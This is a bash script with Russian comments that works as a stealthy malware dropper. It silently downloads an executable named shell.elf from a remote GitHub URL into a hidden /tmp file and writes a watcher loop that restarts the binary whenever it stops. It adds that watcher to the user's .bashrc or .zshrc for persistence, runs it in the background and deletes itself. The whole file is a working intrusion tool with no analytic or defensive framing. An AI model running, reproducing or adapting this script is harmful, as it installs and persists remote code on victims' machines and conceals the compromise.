#!/bin/bash

# Пути
PAYLOAD_URL="https://raw.githubusercontent.com/sys64x/sys/shell.elf"
PAYLOAD_PATH="/tmp/.shell.elf"              # С точкой — скрытый файл
WATCHER_PATH="/tmp/.shell_watcher.sh"       # Скрипт-монитор

AUTOSTART_CMD="$WATCHER_PATH &"
BASHRC="$HOME/.bashrc"
ZSHRC="$HOME/.zshrc"

# Тихий выход без сообщений
silent_exit() {
  exit 1
}

# Проверка curl
command -v curl >/dev/null 2>&1 || silent_exit

# Скачиваем payload скрытно
curl -fsSL "$PAYLOAD_URL" -o "$PAYLOAD_PATH" || silent_exit
chmod +x "$PAYLOAD_PATH" || silent_exit

# Создаем скрипт-монитор, который будет перезапускать payload, если он упал
cat > "$WATCHER_PATH" << 'EOF'
#!/bin/bash
PAYLOAD="/tmp/.shell.elf"

while true; do
  # Проверяем, запущен ли payload
  if ! pgrep -f "$PAYLOAD" > /dev/null; then
    "$PAYLOAD" &
  fi
  sleep 10
done
EOF

chmod +x "$WATCHER_PATH" || silent_exit

# Функция для добавления автозапуска без вывода
add_autostart() {
  local rcfile="$1"
  if [ -f "$rcfile" ]; then
    grep -qxF "$AUTOSTART_CMD" "$rcfile" || echo "$AUTOSTART_CMD" >> "$rcfile"
  else
    echo "$AUTOSTART_CMD" > "$rcfile"
  fi
}

# Определяем оболочку и добавляем автозапуск скрипта-монитора
SHELL_NAME=$(basename "$SHELL")

case "$SHELL_NAME" in
  bash)
    add_autostart "$BASHRC"
    ;;
  zsh)
    add_autostart "$ZSHRC"
    ;;
  *)
    add_autostart "$BASHRC"
    ;;
esac

# Запускаем монитор сразу (в фоне, тихо)
"$WATCHER_PATH" &

# Удаляем исходный скрипт (текущий)
rm -- "$0" 2>/dev/null

exit 0


